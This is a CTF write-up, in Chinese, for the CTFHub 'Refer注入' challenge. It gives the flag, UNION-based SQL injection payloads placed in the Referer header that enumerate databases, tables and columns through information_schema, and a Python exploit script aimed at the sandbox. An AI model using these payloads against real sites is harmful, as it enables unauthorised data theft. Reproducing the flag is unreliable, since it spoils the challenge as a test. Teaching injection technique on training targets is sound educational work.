# CTFHub SQL注入 - Refer注入
## 一、题目信息
平台：CTFHub
分类：Web - SQL注入
题目名称：Refer注入
难度：简单
Flag：`ctfhub{205abe912002c2a7a6a7a445}`

## 二、考点
1. Referer型SQL注入，注入点在Referer请求头内，不是GET/POST参数
2. Union联合查询注入利用
3. MySQL元数据库`information_schema`查询库、表、字段
4. 利用`group_concat`一次性导出多条数据

## 三、题目内容
访问靶场页面，页面接收请求头Referer内容带入SQL查询。页面会回显后端执行的SQL语句，修改Referer会带入SQL语句执行。正常访问时执行SQL：`select * from news where id=Referer内容`。
注入点位于Referer请求头，直接修改Referer的值即可构造SQL语句，执行联合查询。

## 四、解题步骤
1. 判断注入点与回显位
修改Referer内容，Payload：`-1 union select 1,2`，页面`Data`回显2，确认一共有2列，第二位可以回显数据。

2. 查询当前数据库名
构造Payload：`-1 union select 1,database()`
执行后得到数据库名：`sqli`

3. 查询库内所有表名
构造Payload：`-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`
返回表：`eycprhgkkq,news`，news是新闻表，flag存储在`eycprhgkkq`表。

4. 查询目标表的字段名
构造Payload：`-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='eycprhgkkq'`
得到字段：`bfepwcbvhr`

5. 查询flag数据
构造Payload：`-1 union select 1,bfepwcbvhr from eycprhgkkq`
页面回显拿到最终flag。

## 五、Python EXP

{% highlight python %}
import requests

# 替换为真实的靶场地址
url = "http://challenge-34e72ffdb991cef5.sandbox.ctfhub.com:10800/"

# 在Referer头里注入Payload
# 查询 eycprhgkkq 表中 bfepwcbvhr 字段的数据
headers = {"Referer": "-1 union select 1, bfepwcbvhr from eycprhgkkq"}

# 发送GET请求，带上恶意的Referer头
r = requests.get(url, headers=headers, timeout=5)
# 打印服务器返回的页面源码
print(r.text)
{% endhighlight %}

## 六、知识点解析
1. Referer请求头注入：服务端读取Referer请求头的值直接拼接进SQL语句，没有过滤，因此Referer可以作为注入点。很多人只会关注URL参数、POST表单，容易忽略HTTP请求头。
2. union联合查询：`union`可以合并两条select查询的结果，要求前后两个查询字段数量保持一致。使用`id=-1`让前面查询无结果，只展示union后面我们自定义查询的数据。
3. group_concat函数：可以把多条查询结果合并成一行字符串返回，一次性拿到所有表名/字段名，减少多次查询。

## 七、总结
本题属于简单的联合查询注入，和普通GET型注入原理几乎一致，唯一区别是注入点位置在Referer请求头。只需要修改请求头Referer的值来注入，后续库、表、字段查询流程和普通整数型union注入完全相同。解题重点在于发现注入点位置，不要只盯着URL寻找注入点。
